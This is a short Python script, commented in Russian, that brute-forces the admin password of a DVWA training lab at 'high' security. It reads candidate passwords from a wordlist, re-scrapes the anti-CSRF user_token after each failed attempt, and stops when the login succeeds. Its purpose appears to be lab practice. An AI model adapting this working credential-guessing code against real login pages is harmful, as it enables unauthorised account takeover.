import requests
from bs4 import BeautifulSoup as Soup

filename = '1.txt'
success_message = 'Welcome to the password protected area admin'
txt = open(filename)
url = 'http://dvwa.local/vulnerabilities/brute/index.php'
#куки копировать из режима разработчика после входа
cookie = {'security': 'high', 'PHPSESSID': 'i1ev773hnbce7q0ekoraps4hq7'}
s = requests.Session()
target_page = s.get(url, cookies=cookie)


def checkSuccess(html):
    soup = Soup(html, features="lxml")
    search = soup.findAll(text=success_message)

    if not search:
        success = False
    else:
        success = True
    return success


page_source = target_page.text
soup = Soup(page_source, features="lxml")
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
with open(filename) as f:
    print('Начинаем брут-форс...')
    for password in f:
        payload = {'username': 'admin', 'password': password.rstrip('\r\n'), 'Login': 'Login', 'user_token': csrf_token}
        r = s.get(url, cookies=cookie, params=payload)
        success = checkSuccess(r.text)
        if not success:
            soup = Soup(r.text, features="lxml")
            csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
        else:
            print('Пароль = : ' + password)
            break
    if not success:
        print('Брут-форс провален')
